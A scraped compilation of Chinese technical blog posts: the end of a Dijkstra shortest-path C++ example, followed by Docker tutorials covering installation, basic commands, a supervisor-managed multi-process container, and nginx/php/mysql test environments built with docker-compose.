 
    Dijkstra(n, 1, dist, prev, c);
 
    // 最短路径长度
    cout << "源点到最后一个顶点的最短路径长度: " << dist[n] << endl;
 
    // 路径
    cout << "源点到最后一个顶点的路径为: ";
    searchPath(prev, 1, n);
}
输入数据:
5
7
1 2 10
1 4 30
1 5 100
2 3 50
3 5 10
4 3 20
4 5 60
输出数据:
999999 10 999999 30 100
10 999999 50 999999 999999
999999 50 999999 20 10
30 999999 20 999999 60
100 999999 10 60 999999
源点到最后一个顶点的最短路径长度: 60
源点到最后一个顶点的路径为: 1 -> 4 -> 3 -> 5
最后给出两道题目练手，都是直接套用模版就OK的：
1.HDOJ 1874 畅通工程续
http://www.wutianqi.com/?p=1894
2.HDOJ 2544 最短路
http://www.wutianqi.com/?p=1892


 









在Docker – 系统整洁之道 – 1中已经对Docker的一些命令和Docker镜像的使用及操作做了记录。 
这次就利用docker进行一次真正的实例使用，使用docker搭建一个简单的答题系统，这个系统是当时做来给网络安全周做手机答题的系统，很简单，代码风格很差。
这篇主要记录了三种docker使用的方式。

用supervisor方式运行一个多进程的docker实例
创建一个ngnix和php运行的环境
创建一个ngnix，php，mysql集合运行的环境，使用docker-compose构建




感觉docker的东西越看越多，从刚开始的简简单单的一个docker run，到现在看到要build自己的镜像，compose,也就是以前的Fig，配置网络，还有swarm的docker集群，一点一点来吧。

先把两个附件写在这里吧 
此片博客中构建php+ngnix+mysql测试环境的脚本 
在测试环境中的答题网站源码
supervisor方式运行一个多进程的docker实例

Docker 容器在启动的时候开启单个进程，比如，一个 ssh 或者 apache 的 daemon 服务。但我们经常需要在一个机器上开启多个服务，这可以有很多方法，最简单的就是把多个启动命令放到一个启动脚本里面，启动的时候直接启动这个脚本，另外就是安装进程管理工具。这里使用进程管理工具 supervisor 来管理容器中的多个进程。使用 Supervisor 可以更好的控制、管理、重启我们希望运行的进程。
首先创一个文件夹叫做supervisor,目录结构为
~/Docker tree supervisor
supervisor
├── Dockerfile
└── supervisord
其中文件Dockerfile文件内容为：
#使用时哪个镜像
FROM ubuntu:13.04
MAINTAINER examples@docker.com
RUN echo "deb http://archive.ubuntu.com/ubuntu precise main universe" > /etc/apt/sources.list
RUN apt-get update
RUN apt-get upgrade -y

#这里安装 3 个软件，还创建了 2 个 ssh 和 supervisor 服务正常运行所需要的目录。
RUN apt-get install -y --force-yes perl-base=5.14.2-6ubuntu2
RUN apt-get install -y apache2.2-common
RUN apt-get install -y openssh-server apache2 supervisor
RUN mkdir -p /var/run/sshd
RUN mkdir -p /var/log/supervisor

#添加 supervisord 的配置文件，并复制配置文件到对应目录下面。
COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf

#映射了 22 和 80 端口，使用 supervisord 的可执行路径启动服务
EXPOSE 22 80
CMD ["/usr/bin/supervisord"]
文件supervisord内容为：
#supervsord 配置软件本身，使用 nodaemon 参数来运行
[supervisord]
nodaemon=true

#配置两个服务
[program:sshd]
command=/usr/sbin/sshd -D
[program:apache2]
command=/bin/bash -c "source /etc/apache2/envvars && exec /usr/sbin/apache2 -DFOREGROUND"
使用命令进行构建
sudo docker build -t supervisor
输出：
~/Docker/supervisor  sudo docker build -t supervisord .
Password:
Sending build context to Docker daemon 3.584 kB
Step 1 : FROM ubuntu:13.04
---> a58cd502f927
Step 2 : MAINTAINER examples@docker.com
---> Using cache
---> 15f104cdeb77
Step 3 : RUN echo "deb http://archive.ubuntu.com/ubuntu precise main universe" > /etc/apt/sources.list
---> Using cache
---> c6bb44d794ea
Step 4 : RUN apt-get update
---> Using cache
---> adcd83eecb0d
Step 5 : RUN apt-get upgrade -y
---> Using cache
---> 89e045811261
Step 6 : RUN apt-get install -y --force-yes perl-base=5.14.2-6ubuntu2
---> Using cache
---> bcdc472cc73a
Step 7 : RUN apt-get install -y apache2.2-common
---> Using cache
---> d8991f8aa3c6
Step 8 : RUN apt-get install -y openssh-server apache2 supervisor
---> Using cache
---> a713034800d6
Step 9 : RUN mkdir -p /var/run/sshd
---> Using cache
---> 3138e3644958
Step 10 : RUN mkdir -p /var/log/supervisor
---> Using cache
---> 958c08978b0c
Step 11 : COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
---> 8e9a0c97a133
Removing intermediate container d95b58057f73
Step 12 : EXPOSE 22 80
---> Running in 9cabb0865159
---> b4aa8b82cd57
Removing intermediate container 9cabb0865159
Step 13 : CMD /usr/bin/supervisord
---> Running in 237f71166211
---> 569f95736129
Removing intermediate container 237f71166211
Successfully built 569f95736129
使用docker ps 一下
~/Docker/supervisor  docker ps
CONTAINER ID        IMAGE                COMMAND                  CREATED             STATUS              PORTS                                          NAMES
c82c830770bc        supervisord:latest   "/usr/bin/supervisord"   32 seconds ago      Up 30 seconds       0.0.0.0:32770->22/tcp, 0.0.0.0:32769->80/tcp   supervisord
发现刚才build的镜像已经跑起来了，访问 http://127.0.0.1:32769，可以web服务已经跑起来了。

使用命令docker exec进入container里面看看
 ~/Docker/supervisor  docker exec -it c82c830770bc bash
root@c82c830770bc:/# hello
bash: hello: command not found
root@c82c830770bc:/# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var
root@c82c830770bc:/#
使用passwd修改一下密码，然后在本机的命令行里进行ssh连接吧。
ngnix和php运行的环境

该方法就是直接使用docker命令进行构建一个ngnix,php结合运行的环境，没有使用docker-compose。
先用户根目录~下创建目录，并将该目录设置为Docker的共享目录。
Workspace
└── tmp
    ├── docker
    │   └── nginx
    │       └── conf.d
    │           └── default.conf
    └── www
        ├── index.html
        └── phpinfo.php
其中default.conf文件内容，这是个nginx的配置文件
server {
    listen       80;
    server_name  localhost;

    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }

    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

    location ~ \.php$ {
        fastcgi_pass   php:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  /var/www/html/$fastcgi_script_name;
        include        fastcgi_params;
    }
}
index.html 里写一句 HelloW0rld，phpinfo.php里面写一个<?php phpinfo();?>。
然后在命令行下执行命令
docker pull php:5.6-fpm-alpine

docker pull ngnix:1.10.2

docker run --name dream.php -d -v ~/Workspace/tmp/www:/var/www/html:ro php:5.6-fpm

docker run --name dream.nginx -p 80:80 -d -v ~/Workspace/tmp/www:/usr/share/nginx/html:ro -v ~/Workspace/tmp/docker/nginx/conf.d:/etc/nginx/conf.d:ro --link dream.php:php nginx:1.10.2
好的，如果不出意外，就可以看到phpinfo的界面了。这个是没有添加mysql的测试环境，直接在目录~/Workspace/tmp/www下面放网页就可以直接使用了。
ngnix，php，mysql集合运行的环境

Supervisor给出了一种能够在container中运行多个线程的方法，但是现在还是不知道要怎么样把自己的web服务部署到container中，数据库怎么建，可以有人会说直接使用SFTP将网站直接传到container里，安装数据库，配环境，但是docker中一旦container被删除，内容就没了。像这样将所有服务放在一个容器内的模式有个形象的非官方称呼：Fat Container。与之相对的是将服务分拆到容器的模式。从Docker的设计可以看到，构建镜像的过程中可以指定唯一一个容器启动的指令，因此Docker天然适合一个容器只运行一种服务，而这也是官方更推崇的。下面就记录一下部署一个简单的php程序和数据库联动的测试环境。
整体的文件结构是这样的 
我们创建一个这样的目录
Docker
└── test
    ├── data  数据库文件夹
    │   └── mysql
    ├── docker-compose.yml docker-compose配置文件
    ├── htdocs 网站文件夹
    │   ├── index.html
    │   └── index.php
    ├── log 日志文件
    │   └── nginx
    ├── mysql mysql构建文件
    │   └── Dockerfile
    ├── nginx nginx构建文件
    │   ├── Dockerfile
    │   ├── conf.d
    │   │   └── default.conf
    │   └── nginx.conf
    └── php php构建文件
        └── Dockerfile

mysql 独立部署

mysql目录下的Dockerfile文件只有一行FROM mysql:5.6，也就是直接使用mysql官方镜像5.6，然后使用命令
docker build -t phpenv/mysql mysql
构建自己的镜像phpenv/mysql。 
使用命令
docker run -p 3306:3306 -v ~/Docker/test/data/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -it phpenv/mysql
启动镜像，将容器的3306端口绑定到本机的3306端口，其中参数-v后代表使用~/Docker/test/data/mysql挂在到镜像的/var/lib/mysql，也就是替代源镜像的数据库文件目录，让数据库文件目录暴露在本机上，做到数据库内容的持久化。MYSQL_ROOT_PASSWORD为设置mysql的一个root密码。
运行结果
~/Docker/test docker run -p 3306:3306 -v ~/Docker/test/data/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -it phpenv/mysql
2016-12-27 15:06:49 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...
2016-12-27 15:06:49 1 [Warning] Setting lower_case_table_names=2 because file system for /var/lib/mysql/ is case insensitive
2016-12-27 15:06:49 1 [Note] Plugin 'FEDERATED' is disabled.
2016-12-27 15:06:49 1 [Note] InnoDB: Using atomics to ref count buffer pool pages
2016-12-27 15:06:49 1 [Note] InnoDB: The InnoDB memory heap is disabled
2016-12-27 15:06:49 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins
2016-12-27 15:06:49 1 [Note] InnoDB: Memory barrier is not used
2016-12-27 15:06:49 1 [Note] InnoDB: Compressed tables use zlib 1.2.8
2016-12-27 15:06:49 1 [Note] InnoDB: Using Linux native AIO
2016-12-27 15:06:49 1 [Note] InnoDB: Using CPU crc32 instructions
2016-12-27 15:06:49 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M
2016-12-27 15:06:49 1 [Note] InnoDB: Completed initialization of buffer pool
2016-12-27 15:06:49 1 [Note] InnoDB: Highest supported file format is Barracuda.
2016-12-27 15:06:49 1 [Note] InnoDB: 128 rollback segment(s) are active.
2016-12-27 15:06:49 1 [Note] InnoDB: Waiting for purge to start
2016-12-27 15:06:49 1 [Note] InnoDB: 5.6.35 started; log sequence number 1626027
2016-12-27 15:06:49 1 [Note] Server hostname (bind-address): '*'; port: 3306
2016-12-27 15:06:49 1 [Note] IPv6 is available.
2016-12-27 15:06:49 1 [Note]   - '::' resolves to '::';
2016-12-27 15:06:49 1 [Note] Server socket created on IP: '::'.
2016-12-27 15:06:49 1 [Warning] 'proxies_priv' entry '@ root@bd69eb248839' ignored in --skip-name-resolve mode.
2016-12-27 15:06:49 1 [Note] Event Scheduler: Loaded 0 events
2016-12-27 15:06:49 1 [Note] mysqld: ready for connections.
Version: '5.6.35'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server (GPL)
使用DBeaver连接后 

查看一下当前~/Docker/test/data/mysql数据库目录下的文件
~/Docker/test/data/mysql  ls
auto.cnf           ib_logfile0        ib_logfile1        ibdata1            mysql              performance_schema
新建一个库docker_test后~/Docker/test/data/mysql数据库目录下的文件
~/Docker/test/data/mysql ls
auto.cnf           docker_test        ib_logfile0        ib_logfile1        ibdata1            mysql              performance_schema
可以发现数据库已经创建好了，也如下图 

为了验证数据库数据的持久型，我们先停止当前运行的container并产出它，然后从镜像启动一个新的container，如命令
~/Docker ⮀ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
970dec0f7de9        phpenv/mysql        "docker-entrypoint.sh"   30 minutes ago      Up 30 minutes       0.0.0.0:3306->3306/tcp   berserk_brown
~/Docker ⮀ docker stop 970dec0f7de9
970dec0f7de9
~/Docker ⮀ docker rm 970dec0f7de9
970dec0f7de9
~/Docker ⮀ docker ps -a
CONTAINER ID        IMAGE                COMMAND                  CREATED             STATUS                      PORTS               NAMES
c82c830770bc        supervisord:latest   "/usr/bin/supervisord"   35 hours ago        Exited (0) 32 minutes ago                       supervisord
~/Docker ⮀ docker run -p 3306:3306 -v ~/Docker/test/data/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -it phpenv/mysql
2016-12-27 15:38:04 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...
2016-12-27 15:38:04 1 [Warning] Setting lower_case_table_names=2 because file system for /var/lib/mysql/ is case insensitive
2016-12-27 15:38:04 1 [Note] Plugin 'FEDERATED' is disabled.
2016-12-27 15:38:04 1 [Note] InnoDB: Using atomics to ref count buffer pool pages
2016-12-27 15:38:04 1 [Note] InnoDB: The InnoDB memory heap is disabled
2016-12-27 15:38:04 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins
2016-12-27 15:38:04 1 [Note] InnoDB: Memory barrier is not used
2016-12-27 15:38:04 1 [Note] InnoDB: Compressed tables use zlib 1.2.8
2016-12-27 15:38:04 1 [Note] InnoDB: Using Linux native AIO
2016-12-27 15:38:04 1 [Note] InnoDB: Using CPU crc32 instructions
2016-12-27 15:38:04 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M
2016-12-27 15:38:04 1 [Note] InnoDB: Completed initialization of buffer pool
2016-12-27 15:38:04 1 [Note] InnoDB: Highest supported file format is Barracuda.
2016-12-27 15:38:04 1 [Note] InnoDB: 128 rollback segment(s) are active.
2016-12-27 15:38:04 1 [Note] InnoDB: Waiting for purge to start
2016-12-27 15:38:04 1 [Note] InnoDB: 5.6.35 started; log sequence number 1626037
2016-12-27 15:38:04 1 [Note] Server hostname (bind-address): '*'; port: 3306
2016-12-27 15:38:04 1 [Note] IPv6 is available.
2016-12-27 15:38:04 1 [Note]   - '::' resolves to '::';
2016-12-27 15:38:04 1 [Note] Server socket created on IP: '::'.
2016-12-27 15:38:04 1 [Warning] 'proxies_priv' entry '@ root@bd69eb248839' ignored in --skip-name-resolve mode.
2016-12-27 15:38:04 1 [Note] Event Scheduler: Loaded 0 events
2016-12-27 15:38:04 1 [Note] mysqld: ready for connections.
Version: '5.6.35'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server (GPL)
再次连接数据库验证，发现刚才新建的库docker_test还在，数据库文件持久型保存了。
docker-compose 中mysql配置
待完善
docker-compose 中nginx部署
nginx在构建的时候要替换两个配置文件，Dockfile
FROM nginx:1.10.2

ADD  nginx.conf      /etc/nginx/nginx.conf
ADD  conf.d/*    /etc/nginx/conf.d/
挂载文件在docker-compose里进行定义。
待完善
docker-compose 中php配置
php什么也不做，只通过Dockfile
FROM php:5.6-fpm
来构建
待完善
docker-compose 构建

docker-compose文件
nginx:
    build: ./nginx
    ports:
      - "40080:80"
    links:
      - "php"
    volumes:
      - ~/Docker/test/htdocs:/usr/share/nginx/html

php:
    build: ./php
    ports:
      - "49000:9000"
    links:
      - "mysql"
    volumes:
      - ~/Docker/test/htdocs:/var/www/html

mysql:
    build: ./mysql
    ports:
      - "43306:3306"
    volumes:
      - ~/Docker/test/data/mysql:/var/lib/mysql
    environment:
      MYSQL_ROOT_PASSWORD: 123456
记录一下，首先docker-compse是用来集合构建多个镜像的工具，这里我们集合了nginx，php，mysql来搭建一个php的测试环境，在文件中，有一个links参数，是用来连接其他实例，让多个实例之间可以进行通信。
这里有整合文件的下载链接,下载后，将文件放在用户根目录下，命令行执行docker-compose up，结果
~/Docker/test ⮀ docker-compose up
Building mysql
Step 1 : FROM mysql:5.6
---> e1406e1f7c42
Successfully built e1406e1f7c42
WARNING: Image for service mysql was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.
Building php
Step 1 : FROM php:5.6-fpm
5.6-fpm: Pulling from library/php
75a822cd7888: Already exists
e4d8a4e038be: Pull complete
81d4d961577a: Pull complete
54283fea14a4: Pull complete
a1b82ddb6e57: Pull complete
fe532c795718: Pull complete
f02389f3f13e: Pull complete
5777f6cf03c5: Pull complete
24b45111f193: Pull complete
Digest: sha256:022410892774f45ebd39bdb4df39a4a72e6ae5db96a31ee83e7eb25382cd2491
Status: Downloaded newer image for php:5.6-fpm
---> 55423bcf0cfc
Successfully built 55423bcf0cfc
WARNING: Image for service php was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.
Building nginx
Step 1 : FROM nginx:1.10.2
---> c2d83d8cde8d
Step 2 : ADD nginx.conf /etc/nginx/nginx.conf
---> e45c0dceafb9
Removing intermediate container ca538d0f2fd1
Step 3 : ADD conf.d/* /etc/nginx/conf.d/
---> bf0d37221331
Removing intermediate container ebaa3b27453a
Successfully built bf0d37221331
WARNING: Image for service nginx was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.
Creating test_mysql_1
Creating test_php_1
Creating test_nginx_1
Attaching to test_mysql_1, test_php_1, test_nginx_1
mysql_1  | 2016-12-28 07:29:43 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...
mysql_1  | 2016-12-28 07:29:43 1 [Warning] Setting lower_case_table_names=2 because file system for /var/lib/mysql/ is case insensitive
mysql_1  | 2016-12-28 07:29:43 1 [Note] Plugin 'FEDERATED' is disabled.
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Using atomics to ref count buffer pool pages
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: The InnoDB memory heap is disabled
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Memory barrier is not used
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Compressed tables use zlib 1.2.8
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Using Linux native AIO
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Using CPU crc32 instructions
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Completed initialization of buffer pool
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Highest supported file format is Barracuda.
php_1    | [28-Dec-2016 07:29:43] NOTICE: fpm is running, pid 1
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: 128 rollback segment(s) are active.
php_1    | [28-Dec-2016 07:29:43] NOTICE: ready to handle connections
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: Waiting for purge to start
mysql_1  | 2016-12-28 07:29:43 1 [Note] InnoDB: 5.6.35 started; log sequence number 1626263
mysql_1  | 2016-12-28 07:29:43 1 [Note] Server hostname (bind-address): '*'; port: 3306
mysql_1  | 2016-12-28 07:29:43 1 [Note] IPv6 is available.
mysql_1  | 2016-12-28 07:29:43 1 [Note]   - '::' resolves to '::';
mysql_1  | 2016-12-28 07:29:43 1 [Note] Server socket created on IP: '::'.
mysql_1  | 2016-12-28 07:29:43 1 [Warning] 'proxies_priv' entry '@ root@bd69eb248839' ignored in --skip-name-resolve mode.
mysql_1  | 2016-12-28 07:29:43 1 [Note] Event Scheduler: Loaded 0 events
mysql_1  | 2016-12-28 07:29:43 1 [Note] mysqld: ready for connections.
mysql_1  | Version: '5.6.35'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server (GPL)
访问一下 http://localhost:40080/index.php ，正常的话，如下图

启动一个真实的代码
下面的代码是今年网络安全周的一个手机在线答题系统，代码很挫，大牛误笑
源码在这里。
将目录直接放在~/Docker/test/htdocs下面，然后在test目录下执行docker-compose up，正常情况下，就会跑起来上面的容器，然后按照代码的README将数据库部署就可以运行了。

参考链接


Docker 从入门到实践
第一本Docker书
如何进入一个正在运行的Container
Docker在PHP项目开发环境中的应用

原文链接： 
http://dengnanyi.com/2016/12/24/2016_12/docker-learn-3/ 









在我的小 rmbp 256G的硬盘里，实在是装不下100多个G的虚拟机了，所以想把一些东西迁移到这两年很火的Docker下，Docker以前也有过一两次，只是按着别人给的用法用的，具体的一些细节并没有深入，和git一样，这么牛掰的东西怎么能不好好学一些呢？


Docker和虚拟机的区别

Docker是一种容器，虚拟机是一种管理程序虚拟机化(hypervisor virtualization,HV)。管理程序虚拟化通过中间层将一台或者多台独立的机器虚拟运行在物理硬件之上，而容器(比如Docker)则是直接运行在操作系统内核之上的用户空间。由于容器是运行在操作系统上的，所以只能运行底层和宿主机相同或者类似的操作系统，比如说在Ubuntu下可以在容器里运行Centos，却不能运行Windows。

目前Windows上的Docker可以跑Linux的Docker容器，是因为底下跑了Linux的VM，但是马上就可以支持Windows Server 2016了，如链接[Introducing the Technical Preview of Docker Engine for Windows Server 2016](http://Introducing the Technical Preview of Docker Engine for Windows Server 2016)。

容器的优点：

一次save，到处运行。
启动速度快，消耗资源少。Docker与虚拟机性能比较

容器缺点：

资源隔离方面不如虚拟机。
安全性问题，“权限隔离”做的不够好，只要有Docker的命令权限，就可以操作所有的Docker实例。

Docker的目标


提供一个简单、轻量的建模方式。
职责的逻辑分离，防止开发环境和部署环境不一致，导致出现“开发时一切正常，肯定是运维问题”的情况。
快速、高效的开发生命周期。

Docker的核心组件


Docker客户端和服务器
Docker是一个C/S架构的程序，Docker客户端需要向Docker服务器发出请求，服务器完成请求后返回信息。一个本地Docker客户端可以连接远端的Docker服务器进行操作，如下图。

Docker镜像
镜像是构建Docker世界的基石。用户基于镜像来维护自己的容器。Docker镜像是Docker容器运行时的只读模板，每一个镜像由一系列的层 (layers) 组成。Docker使用 UnionFS来将这些层联合到单独的镜像中。UnionFS允许独立文件系统中的文件和文件夹(称之为分支)被透明覆盖，形成一个单独连贯的文件系统。正因为有了这些层的存在，Docker是如此的轻量。当你改变了一个Docker镜像，比如升级到某个程序到新的版本，一个新的层会被创建。因此，不用替换整个原先的镜像或者重新建立(在使用虚拟机的时候你可能会这么做)，只是一个新的层被添加或升级了。现在你不用重新发布整个镜像，只需要升级，层使得分发Docker镜像变得简单和快速。
Docker仓库(Registry)
Docker使用Registry来保存用户构建的镜像，就像苹果的apple store。Registry分为私有和公有两种，Docker公司自己运营的Registry叫做Docker Hub。
Docker容器
Docker可以帮你构建和部署容器，用户只需要把自己的应用程序或服务打包放进容器即可。每一个Docker容器都是从Docker镜像创建的。Docker容器可以运行、开始、停止、移动和删除。每一个Docker容器都是独立和安全的应用平台，Docker容器是Docker的运行部分。
Docker的技术组件
Docker可以被安装在x64架构，内核3.10以上的linux系主机、win10以上windows和OS X 10.10.3且2010年以后的Mac上。在2013年Docker刚发布的时候，它是一款基于LXC的开源容器管理引擎。把LXC复杂的容器创建与使用方式简化为Docker自己的一套命令体系。 随着Docker的不断发展，它开始有了更为远大的目标，那就是反向定义容器的实现标准，将底层实现都抽象化到Libcontainer的接口。这就意味 着，底层容器的实现方式变成了一种可变的方案，无论是使用namespace、cgroups技术抑或是使用systemd等其他方案，只要实现了 Libcontainer定义的一组接口，Docker都可以运行。

安装

安装方法都很简单，值得注意的是当前Docker版本的安装需求，比如现在Linux下安装的需求就上x64架构，内核3.10以上。
Mac下安装方法，直接在官网上下载docker app，安装即可。 
Linux下安装方法，Linux下最简单的安装方法就是apt和yum包管理工具进行安装了。 
Windows下安装方法
还有一个比较好用的安装脚本，这个脚本只支持在lsb、debian、fedora、oracle、centos、redhat、os这几个发行版中使用。
在安装结束后，可以使用docker info命令来查看Docker是否装好了。Mac下的docker info结果：
~  docker info
Containers: 0
Running: 0
Paused: 0
Stopped: 0
Images: 0
Server Version: 1.12.1
Storage Driver: aufs
Root Dir: /var/lib/docker/aufs
Backing Filesystem: extfs
Dirs: 0
Dirperm1 Supported: true
Logging Driver: json-file
Cgroup Driver: cgroupfs
Plugins:
Volume: local
Network: null bridge host overlay
Swarm: inactive
Runtimes: runc
Default Runtime: runc
Security Options: seccomp
Kernel Version: 4.4.20-moby
Operating System: Alpine Linux v3.4
OSType: linux
Architecture: x86_64
CPUs: 4
Total Memory: 1.952 GiB
Name: moby
ID: FSZQ:ZPKN:NEUW:55GH:Q33R:7L7M:5FLN:GW6E:CLHJ:NO66:WL4K:A3L5
Docker Root Dir: /var/lib/docker
Debug Mode (client): false
Debug Mode (server): true
File Descriptors: 34
Goroutines: 98
System Time: 2016-09-29T01:48:55.851895948Z
EventsListeners: 2
Registry: https://index.docker.io/v1/
Insecure Registries:
127.0.0.0/8
Mac装好后如下图的样子，基本功能都已经在菜单上了。

同时Mac还有一个GUI界面Kitmatic，目前还是beta版，但是用起来还是很不错的。

各种各样的image看起来很好看。
使用入门

先把Docker的命令行打印出来。
~  docker --help
Usage: docker [OPTIONS] COMMAND [arg...]
      docker [ --help | -v | --version ]

A self-sufficient runtime for containers.

Options:

 --config=~/.docker              Location of client config files
 -D, --debug                     Enable debug mode
 -H, --host=[]                   Daemon socket(s) to connect to
 -h, --help                      Print usage
 -l, --log-level=info            Set the logging level
 --tls                           Use TLS; implied by --tlsverify
 --tlscacert=~/.docker/ca.pem    Trust certs signed only by this CA
 --tlscert=~/.docker/cert.pem    Path to TLS certificate file
 --tlskey=~/.docker/key.pem      Path to TLS key file
 --tlsverify                     Use TLS and verify the remote
 -v, --version                   Print version information and quit

Commands:
   attach    Attach to a running container
   build     Build an image from a Dockerfile
   commit    Create a new image from a container's changes
   cp        Copy files/folders between a container and the local filesystem
   create    Create a new container
   diff      Inspect changes on a container's filesystem
   events    Get real time events from the server
   exec      Run a command in a running container
   export    Export a container's filesystem as a tar archive
   history   Show the history of an image
   images    List images
   import    Import the contents from a tarball to create a filesystem image
   info      Display system-wide information
   inspect   Return low-level information on a container, image or task
   kill      Kill one or more running containers
   load      Load an image from a tar archive or STDIN
   login     Log in to a Docker registry.
   logout    Log out from a Docker registry.
   logs      Fetch the logs of a container
   network   Manage Docker networks
   node      Manage Docker Swarm nodes
   pause     Pause all processes within one or more containers
   port      List port mappings or a specific mapping for the container
   ps        List containers
   pull      Pull an image or a repository from a registry
   push      Push an image or a repository to a registry
   rename    Rename a container
   restart   Restart a container
   rm        Remove one or more containers
   rmi       Remove one or more images
   run       Run a command in a new container
   save      Save one or more images to a tar archive (streamed to STDOUT by default)
   search    Search the Docker Hub for images
   service   Manage Docker services
   start     Start one or more stopped containers
   stats     Display a live stream of container(s) resource usage statistics
   stop      Stop one or more running containers
   swarm     Manage Docker Swarm
   tag       Tag an image into a repository
   top       Display the running processes of a container
   unpause   Unpause all processes within one or more containers
   update    Update configuration of one or more containers
   version   Show the Docker version information
   volume    Manage Docker volumes
   wait      Block until a container stops, then print its exit code

Run 'docker COMMAND --help' for more information on a command.'
我相信能用Docker都是的大神，就不翻译了。
在安装好以后来运行一个最简单的hello world吧。
docker run hello-world
所见即所得，如图。

在运行docker run的时候，可以看到打印出了Hello from Docker!，首先docker在本地去检查了是否有一个叫做hello-world的镜像，在这里，我们刚装好的docker里必然是没有的，所以docker就去Docker Hub上找这个镜像，找到以后下载下来，run。读一下这个helloworld的输出，可以docker run -it ubuntu bash来运行一个ubuntu。来试一试
# -i 代表保持STDIN开启，-t 代表为容器分配一个tty。
docker run -it ubuntu bash
运行以后，在docker hub里下载好ubuntu镜像后，docker构造好容器启动，就可以和正常的shell一样的进行操作了。

更多内容尽在docker-learn1。
参考链接


[Introducing the Technical Preview of Docker Engine for Windows Server 2016](http://Introducing the Technical Preview of Docker Engine for Windows Server 2016)
Docker与虚拟机性能比较
第一本Docker书
5分钟弄懂Docker
一次“奇幻”的Docker libcontainer代码阅读之旅
Docker背后的容器管理—Libcontainer深度解析
LXC：Linux 容器工具
阿里云Registry加速器
docker使用阿里云Docker镜像库加速
非常好的一篇Docker教程，比较全面
知乎_Docker的应用场景在哪里
一个比较详细的命令用法

原文链接：http://dengnanyi.com/2016/09/28/docker-learn-0/ 









在上文Docker – 系统整洁之道 – 0中已经对Docker是什么，安装Docker以及怎么运行一个简单的容器有了初步了解，这篇文章介绍Docker的一些命令和Docker镜像的使用及操作。


一些Docker命令

Docker的命令按照使用一个容器的顺序进行。
docker info 查看Docker的信息
~  docker info
Containers: 0
Running: 0
Paused: 0
Stopped: 0
Images: 8
Server Version: 1.12.1
Storage Driver: aufs
Root Dir: /var/lib/docker/aufs
...
能查看到docker信息，说明docker是安装好的。
docker run 运行一个容器
~  docker run -it ubuntu
root@8eac2e6cf194:/# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@8eac2e6cf194:/#
由于在上文中已经运行过一次该条命令，所以ubuntu的镜像已经下载到了本地，此次运行就可以使用该镜像产生一个容器，在容器启动后，上过-it获取到命令行，运行命令ls。
使用–name标志可以给容器定义一个名字，如 
docker run –name this_is_first_ubunt_container -it ubuntu 
就会创建一个名字叫做this_is_first_ubunt_container的ubuntu的容器。名字只能使用大小写字母，数字，下划线，原点和横线，即[a-zA-Z0-9_.-]。

关于docker run的帮助可以使用docker run --help获取。

docker ps 列出所有的容器
~  docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
8eac2e6cf194        ubuntu              "/bin/bash"         5 minutes ago       Up 5 minutes                            modest_davinci
使用docker ps命令可以看到当前正在运行的容器有哪些，并给出了一些相应的属性。给命令增加参数-a就可以获取当前所有的容器，包括已经停止的，如下。
~  docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED              STATUS                          PORTS               NAMES
4d0cc9a960f1        hello-world         "/hello"            About a minute ago   Exited (0) About a minute ago                       small_roentgen
8eac2e6cf194        ubuntu              "/bin/bash"         4 minutes ago        Up 4 minutes                                        modest_davinci
docker ps -n x，显示最后x个容器，不管容器正在运行还是停止。
docker start 重新启动已经停止的容器
docker start 
docker start this_is_first_ubunt_container
docker attatch 附着容器
docker attach this_is_first_ubunt_container
docker stop 停止一个容器
~  docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES
4d0cc9a960f1        hello-world         "/hello"            4 minutes ago       Exited (0) 4 minutes ago                       small_roentgen
8eac2e6cf194        ubuntu              "/bin/bash"         8 minutes ago       Up 8 minutes                                   modest_davinci
~  docker stop 8eac2e6cf194
8eac2e6cf194
~  docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES
